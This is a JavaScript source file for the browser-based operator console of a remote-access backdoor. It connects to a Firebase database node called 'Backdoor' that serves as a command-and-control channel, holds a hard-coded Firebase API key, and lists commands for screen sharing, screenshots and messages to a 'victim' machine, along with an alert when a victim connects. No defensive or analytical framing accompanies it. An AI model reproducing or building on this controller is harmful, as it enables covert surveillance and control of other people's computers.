var token;
const cursor=document.getElementById("cursor");
var out=document.getElementById("output");

var cwd=document.getElementById("cwd");;
var cl=["<br>&ensp;##### All commandlines #####<br>", "send--msg--title", "share scr", "send ss", "clear: use 'cls' command before using 'clear'", "db status", "change key", "quit-s: for your machine => 'server-quit'", "quit-v:  for victim's machine"];
var sl=["cmd-list","clear", "db status","quit-s", "change key"];
var req=0;
var nums=0;

// var keylog=cmd;
var self=true, delayStart=false; //show out
var user=false, login=false, vdone=false;
let blink=true;


// For Firebase JS SDK v7.20.0 and later, measurementId is optional
var firebaseConfig = {
  apiKey: "AIzaSyAxW0ZX1klHmQ4JfiYo_L4VVdaf8BOOq_A",
  authDomain: `${token}.firebaseapp.com`,
  databaseURL: `https://${token}-default-rtdb.firebaseio.com`,
  projectId: `${token}`,
  storageBucket: `${token}.appspot.com`,
  messagingSenderId: "234616315547",
  appId: "1:234616315547:web:d0f2aab2f4e1c3938df03e",
  measurementId: "G-2XP435YJ0Y"
};

function varify(cmdv){

    // ###### Configuration ######
    if(!vdone) {
      console.log(cmdv)
    token=cmdv;
    firebaseConfig["authDomain"]=`${token}.firebaseapp.com`;
    firebaseConfig["projectId"]=token;
    firebaseConfig["storageBucket"]=`${token}.appspot.com`;
    firebaseConfig["databaseURL"]=`https://${token}-default-rtdb.firebaseio.com`;
    if(firebase.apps.length === 0) {
      firebase.initializeApp(firebaseConfig);
    }

    db=firebase.database().ref("Backdoor");

    db.once('value', (a)=>{
      print("conn-status: "+a.val().conn)
      print("output: "+a.val().output)
      print("victim: "+a.val().victim)
      print(a.val().process)
      print("* Make sure if you have set victim unknown: ")
      print("" , 2) //create input box
      // keylog=t[t.length-2]
    })

    db.on('child_removed', (a)=>{
      alert("Victim arrived!");
    })

    setTimeout(() => {
      if(localStorage.getItem("firebase:previous_websocket_failure")=="true"){
        out.style.color="red";
        print("invalid acceskey attempted...")
      }
      else {}
    }, 3000);
    vdone=true;
    }
}

var db;

var i1,i2;
window.addEventListener("click", ()=>{
  s();
  window.removeEventListener('click', s);
})

function s() {
  if(blink){
    i1=setInterval(() => {
      document.getElementById("cursor").style.visibility="hidden";
    }, 600);
  
    i2=setInterval(() => {
        document.getElementById("cursor").style.visibility="visible";
    }, 1200);
  }
  blink=false;
}